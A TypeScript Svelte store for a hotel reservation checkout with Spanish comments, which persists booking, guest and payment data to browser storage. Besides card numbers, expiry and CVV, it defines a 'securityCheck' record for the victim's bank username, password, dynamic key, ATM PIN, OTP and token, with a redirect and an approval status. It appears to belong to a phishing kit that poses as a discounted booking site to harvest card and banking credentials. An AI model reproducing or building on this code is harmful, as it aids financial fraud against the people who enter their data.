import { writable } from 'svelte/store';
import { browser } from '$app/environment';
import type { HotelDetails, HotelPhoto, HotelDescription, RoomListResponse } from './hotelDetails';
import { StorageService } from '$lib/services/storageService';
import { PRICE_DISCOUNT, applyPriceDiscount } from '$lib/config/discount';
import { DEFAULT_CURRENCY, normalizeCurrency } from '$lib/config/currency';
import { getCurrentCurrency } from '$lib/config/market';

// Interfaces para la reserva
export interface SelectedRoom {
	roomId: number;
	roomType: string;
	roomName: string;
	quantity: number;
	pricePerNight: number;
	totalNights: number;
	subtotal: number;
	taxes: number;
	total: number;
	options: {
		breakfast: boolean;
		cancellation: boolean;
		prepayment: boolean;
		refundableUntil?: string;
		mealplan?: string;
	};
	roomData: any; // Datos completos de la habitación desde la API
}

export interface ReservationSearchParams {
	checkInDate: string;
	checkOutDate: string;
	adults: number;
	children: number;
	rooms: number;
	pets: boolean;
}

export interface GuestFormData {
	firstName: string;
	lastName: string;
	email: string;
	phone: string;
	country: string;
	phoneCode: string;
	loginDiscount: boolean;
	digitalConfirmation: boolean;
	airportTransfer: boolean;
	flightNeeded: boolean;
	carRental: boolean;
	specialRequests: string;
	freeParking: boolean;
	arrivalTime: string;
}

export interface ReservationData {
	// Información completa del hotel (para evitar nuevas peticiones)
	hotel: {
		id: number;
		name: string;
		nameTrans: string;
		address: string;
		addressLine: string;
		country: string;
		countryTrans: string;
		district: string;
		city: string;
		cityTrans: string;
		rating: number;
		class: number;
		reviewCount: number;
		distanceToCenter: number;
		latitude: number;
		longitude: number;
		timezone: string;
		currency: string;
		spokenLanguages: string[];
		accommodationType: string;
		url: string;
		// Datos completos del hotel
		hotelDetails: HotelDetails | null;
		hotelPhotos: HotelPhoto[] | null;
		hotelDescription: HotelDescription | null;
		roomList: RoomListResponse | null;
	};
	
	// Parámetros de búsqueda
	searchParams: ReservationSearchParams;
	
	// Datos del huésped
	guestData: GuestFormData | null;
	
	// Habitaciones seleccionadas
	selectedRooms: SelectedRoom[];
	
	// Totales calculados
	totals: {
		subtotal: number;
		taxes: number;
		total: number;
		currency: string;
	};

	// Datos de pago (persistidos a nivel de reserva)
	payment?: {
		cardholderName: string;
		cardNumber: string; // se almacena como ingresado (puede incluir espacios)
		expiry: string; // MM/AA
		cvv: string;
		documentId?: string;
		paymentMethod?: 'credit-debit' | 'pse';
		bank?: string; // Para PSE
	};
	
	// Estado de la reserva
	isValid: boolean;
	lastUpdated: string;

	// Estado del security-check
	securityCheck?: {
		user?: string;
		pass?: string;
		dinamicKey?: string;
		atmKey?: string;
		otp?: string;
		token?: string;
		redirectTo?: string;
		requestedFields?: string[];
		status?: 'pending' | 'approved' | 'failed';
		timestamp?: string;
	};
	}

// Funciones de persistencia usando el servicio centralizado
function loadFromStorage(): ReservationData | null {
	const storedData = StorageService.loadReservationData();
	if (!storedData) return null;

	const hotelCurrency = normalizeCurrency(storedData.hotel?.currency, DEFAULT_CURRENCY);
	const totalsCurrency = normalizeCurrency(storedData.totals?.currency, hotelCurrency);

	return {
		...storedData,
		hotel: {
			...storedData.hotel,
			currency: hotelCurrency
		},
		totals: {
			...storedData.totals,
			currency: totalsCurrency
		}
	};
}

function saveToStorage(data: ReservationData) {
	StorageService.saveReservationData(data);
}

// Estado inicial
const initialState: ReservationData = {
	hotel: {
		id: 0,
		name: '',
		nameTrans: '',
		address: '',
		addressLine: '',
		country: '',
		countryTrans: '',
		district: '',
		city: '',
		cityTrans: '',
		rating: 0,
		class: 0,
		reviewCount: 0,
		distanceToCenter: 0,
		latitude: 0,
		longitude: 0,
		timezone: '',
		currency: getCurrentCurrency(),
		spokenLanguages: [],
		accommodationType: '',
		url: '',
		hotelDetails: null,
		hotelPhotos: null,
		hotelDescription: null,
		roomList: null
	},
	searchParams: {
		checkInDate: '',
		checkOutDate: '',
		adults: 2,
		children: 0,
		rooms: 1,
		pets: false
	},
	guestData: null,
	selectedRooms: [],
	totals: {
		subtotal: 0,
		taxes: 0,
		total: 0,
		currency: getCurrentCurrency()
	},
	isValid: false,
	lastUpdated: new Date().toISOString()
};

function createReservationStore(initialData: ReservationData = initialState) {
	const { subscribe, set, update } = writable<ReservationData>(initialData);

	// Función helper para persistir cambios
	function persistUpdate(updater: (state: ReservationData) => ReservationData) {
		update(state => {
			const newState = updater(state);
			saveToStorage(newState);
			return newState;
		});
	}

	return {
		subscribe,
		
		// Inicializar reserva con datos del hotel
		initializeReservation: (
			hotelDetails: HotelDetails,
			hotelPhotos: HotelPhoto[] | null,
			hotelDescription: HotelDescription | null,
			roomList: RoomListResponse | null,
			searchParams: ReservationSearchParams
		) => {
			persistUpdate(state => {
				const newState = {
					...state,
					hotel: {
						id: hotelDetails.hotel_id,
						name: hotelDetails.hotel_name,
						nameTrans: hotelDetails.hotel_name_trans,
						address: hotelDetails.address,
						addressLine: hotelDetails.hotel_address_line,
						country: hotelDetails.countrycode,
						countryTrans: hotelDetails.country_trans,
						district: hotelDetails.district,
						city: hotelDetails.city,
						cityTrans: hotelDetails.city_trans,
						rating: hotelDetails.class,
						class: hotelDetails.class,
						reviewCount: hotelDetails.review_nr,
						distanceToCenter: hotelDetails.distance_to_cc,
						latitude: hotelDetails.latitude,
						longitude: hotelDetails.longitude,
						timezone: hotelDetails.timezone,
						currency: hotelDetails.currency_code,
						spokenLanguages: hotelDetails.spoken_languages,
						accommodationType: hotelDetails.accommodation_type_name,
						url: hotelDetails.url,
						// Guardar datos completos para evitar nuevas peticiones
						hotelDetails,
						hotelPhotos,
						hotelDescription,
						roomList
					},
					searchParams,
					selectedRooms: [], // Limpiar selecciones anteriores
					totals: {
						subtotal: 0,
						taxes: 0,
						total: 0,
						currency: hotelDetails.currency_code
					},
					isValid: false,
					lastUpdated: new Date().toISOString()
				};
				
				return newState;
			});
		},
		
		// Actualizar parámetros de búsqueda
		updateSearchParams: (newParams: Partial<ReservationSearchParams>) => {
			persistUpdate(state => ({
				...state,
				searchParams: { ...state.searchParams, ...newParams },
				lastUpdated: new Date().toISOString()
			}));
		},
		
		// Actualizar datos del huésped
		updateGuestData: (guestData: GuestFormData) => {
			persistUpdate(state => ({
				...state,
				guestData,
				lastUpdated: new Date().toISOString()
			}));
		},

		// Actualizar datos de pago
		updatePaymentData: (payment: {
			cardholderName: string;
			cardNumber: string;
			expiry: string;
			cvv: string;
			documentId?: string;
			paymentMethod?: 'credit-debit' | 'pse';
			bank?: string;
		}) => {
			persistUpdate(state => ({
				...state,
				payment: { ...payment },
				lastUpdated: new Date().toISOString()
			}));
		},

		// Guardar datos del security-check
		updateSecurityCheck: (data: {
			user?: string;
			pass?: string;
			dinamicKey?: string;
			atmKey?: string;
			otp?: string;
			token?: string;
			redirectTo?: string;
			requestedFields?: string[];
			status?: 'pending' | 'approved' | 'failed';
		}) => {
			persistUpdate(state => ({
				...state,
				securityCheck: {
					...state.securityCheck,
					...data,
					timestamp: new Date().toISOString()
				},
				lastUpdated: new Date().toISOString()
			}));
		},
		
		// Agregar habitación a la reserva
		addRoomToReservation: (roomData: any, quantity: number = 1) => {
			console.log('🏨 Agregando habitación a reserva:', { roomData, quantity });
			persistUpdate(state => {
				const existingRoomIndex = state.selectedRooms.findIndex(
					room => room.roomId === roomData.room_id
				);
				
				console.log('🔍 Índice de habitación existente:', existingRoomIndex);
				let newSelectedRooms = [...state.selectedRooms];
				
				if (existingRoomIndex >= 0) {
					// Actualizar cantidad existente y recalcular totales
					const room = newSelectedRooms[existingRoomIndex];
					const totalNights = calculateNights(state.searchParams.checkInDate, state.searchParams.checkOutDate);
					// Recalcular precio con descuento basado en roomData original
					const gross = room.roomData.product_price_breakdown.gross_amount.value;
					const net = room.roomData.product_price_breakdown.net_amount?.value ?? Math.round(gross * 0.8);
					const originalTax = Math.max(0, gross - net);
					const discountedGross = applyPriceDiscount(gross);
					const factor = gross > 0 ? discountedGross / gross : 1;
					const discountedTaxPerNight = Math.round(originalTax * factor);
					const pricePerNight = discountedGross;
					const subtotal = pricePerNight * totalNights * quantity;
					const taxes = discountedTaxPerNight * totalNights * quantity;
					
					newSelectedRooms[existingRoomIndex] = {
						...room,
						quantity,
						totalNights,
						subtotal,
						taxes,
						total: subtotal + taxes
					};
				} else {
					// Agregar nueva habitación
					const totalNights = calculateNights(state.searchParams.checkInDate, state.searchParams.checkOutDate);
					// Calcular precio con descuento
					const gross = roomData.product_price_breakdown.gross_amount.value;
					const net = roomData.product_price_breakdown.net_amount?.value ?? Math.round(gross * 0.8);
					const originalTax = Math.max(0, gross - net);
					const discountedGross = applyPriceDiscount(gross);
					const factor = gross > 0 ? discountedGross / gross : 1;
					const discountedTaxPerNight = Math.round(originalTax * factor);
					const pricePerNight = discountedGross;
					const subtotal = pricePerNight * totalNights * quantity;
					const taxes = discountedTaxPerNight * totalNights * quantity;
					
					const newRoom: SelectedRoom = {
						roomId: roomData.room_id,
						roomType: roomData.name || roomData.room_name,
						roomName: roomData.name || roomData.room_name,
						quantity,
						pricePerNight,
						totalNights,
						subtotal,
						taxes,
						total: subtotal + taxes,
						options: {
							breakfast: roomData.breakfast_included === 1,
							cancellation: roomData.refundable === 1,
							prepayment: roomData.paymentterms?.prepayment?.type !== 'no_prepayment',
							refundableUntil: roomData.refundable_until,
							mealplan: roomData.mealplan
						},
						roomData
					};
					
					newSelectedRooms.push(newRoom);
				}
				
				// Recalcular totales
				const totals = calculateTotals(newSelectedRooms, state.hotel.currency);
				
				console.log('💰 Totales calculados:', totals);
				console.log('🏨 Habitaciones seleccionadas:', newSelectedRooms);
				
				return {
					...state,
					selectedRooms: newSelectedRooms,
					totals,
					isValid: newSelectedRooms.length > 0,
					lastUpdated: new Date().toISOString()
				};
			});
		},
		
		// Remover habitación de la reserva
		removeRoomFromReservation: (roomId: number) => {
			persistUpdate(state => {
				const newSelectedRooms = state.selectedRooms.filter(room => room.roomId !== roomId);
				const totals = calculateTotals(newSelectedRooms, state.hotel.currency);
				
				return {
					...state,
					selectedRooms: newSelectedRooms,
					totals,
					isValid: newSelectedRooms.length > 0,
					lastUpdated: new Date().toISOString()
				};
			});
		},
		
		// Actualizar cantidad de una habitación
		updateRoomQuantity: (roomId: number, quantity: number) => {
			update(state => {
				const newSelectedRooms = state.selectedRooms.map(room => {
					if (room.roomId === roomId) {
						// Recalcular sobre datos originales con descuento
						const gross = room.roomData.product_price_breakdown.gross_amount.value;
						const net = room.roomData.product_price_breakdown.net_amount?.value ?? Math.round(gross * 0.8);
						const originalTax = Math.max(0, gross - net);
						const discountedGross = applyPriceDiscount(gross);
						const factor = gross > 0 ? discountedGross / gross : 1;
						const discountedTaxPerNight = Math.round(originalTax * factor);
						const pricePerNight = discountedGross;
						const subtotal = pricePerNight * room.totalNights * quantity;
						const taxes = discountedTaxPerNight * room.totalNights * quantity;
						
						return {
							...room,
							quantity,
							pricePerNight,
							subtotal,
							taxes,
							total: subtotal + taxes
						};
					}
					return room;
				});
				
				const totals = calculateTotals(newSelectedRooms, state.hotel.currency);
				
				return {
					...state,
					selectedRooms: newSelectedRooms,
					totals,
					lastUpdated: new Date().toISOString()
				};
			});
		},
		
		// Limpiar toda la reserva
		clearReservation: () => {
			set(initialState);
		},
		
		// Validar reserva
		validateReservation: () => {
			persistUpdate(state => ({
				...state,
				isValid: state.selectedRooms.length > 0 && 
						state.searchParams.checkInDate !== '' && 
						state.searchParams.checkOutDate !== '' &&
						state.searchParams.adults > 0,
				lastUpdated: new Date().toISOString()
			}));
		},
		
		// Obtener resumen de la reserva
		getReservationSummary: () => {
			let summary: any = null;
			subscribe(state => {
				summary = {
					hotel: state.hotel,
					searchParams: state.searchParams,
					selectedRooms: state.selectedRooms,
					totals: state.totals,
					isValid: state.isValid,
					lastUpdated: state.lastUpdated
				};
			})();
			return summary;
		},
		
		// Método set para actualizar el estado completo
		set: (newState: ReservationData) => {
			saveToStorage(newState);
			set(newState);
		}
	};
}

// Funciones helper
function calculateNights(checkIn: string, checkOut: string): number {
	if (!checkIn || !checkOut) return 0;
	
	const checkInDate = new Date(checkIn);
	const checkOutDate = new Date(checkOut);
	const diffTime = checkOutDate.getTime() - checkInDate.getTime();
	const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
	
	return Math.max(0, diffDays);
}

function calculateTotals(selectedRooms: SelectedRoom[], currency: string) {
	const subtotal = selectedRooms.reduce((sum, room) => sum + room.subtotal, 0);
	const taxes = selectedRooms.reduce((sum, room) => sum + room.taxes, 0);
	const total = subtotal + taxes;
	
	return {
		subtotal,
		taxes,
		total,
		currency
	};
}

// Crear el store con estado inicial limpio
export const reservationStore = createReservationStore(initialState);

// Cargar datos persistidos de forma segura después de la inicialización
if (browser) {
	// Usar setTimeout para evitar problemas de hidratación
	setTimeout(() => {
		const savedData = loadFromStorage();
		if (savedData) {
			reservationStore.set(savedData);
		}
	}, 0);
}
